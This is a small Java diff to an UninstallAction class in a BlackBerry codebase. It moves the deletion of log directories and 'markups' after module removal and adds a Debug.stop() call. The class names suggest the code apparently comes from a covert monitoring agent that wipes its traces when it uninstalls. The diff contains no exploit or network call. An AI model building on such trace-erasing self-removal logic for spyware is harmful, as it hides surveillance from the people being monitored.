@@ -19,6 +19,7 @@ import blackberry.event.Event;
 import blackberry.log.LogCollector;
 import blackberry.log.Markup;
 import blackberry.utils.Check;
+import blackberry.utils.Debug;
 import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -72,10 +73,7 @@ public final class UninstallAction extends SubAction {
         EventManager.getInstance().stopAll();
 
         Utils.sleep(5000);
-
-        LogCollector.getInstance().removeLogDirs();
-        Markup.removeMarkups();
-
+    
         LogCollector.getInstance().removeProgressive();
 
         final ApplicationDescriptor ad = ApplicationDescriptor
@@ -133,6 +131,10 @@ public final class UninstallAction extends SubAction {
                 CodeModuleManager.deleteModuleEx(handle, true);
             }
         }
+        
+        Debug.stop();
+        LogCollector.getInstance().removeLogDirs();
+        Markup.removeMarkups();
 
         return true;
     }
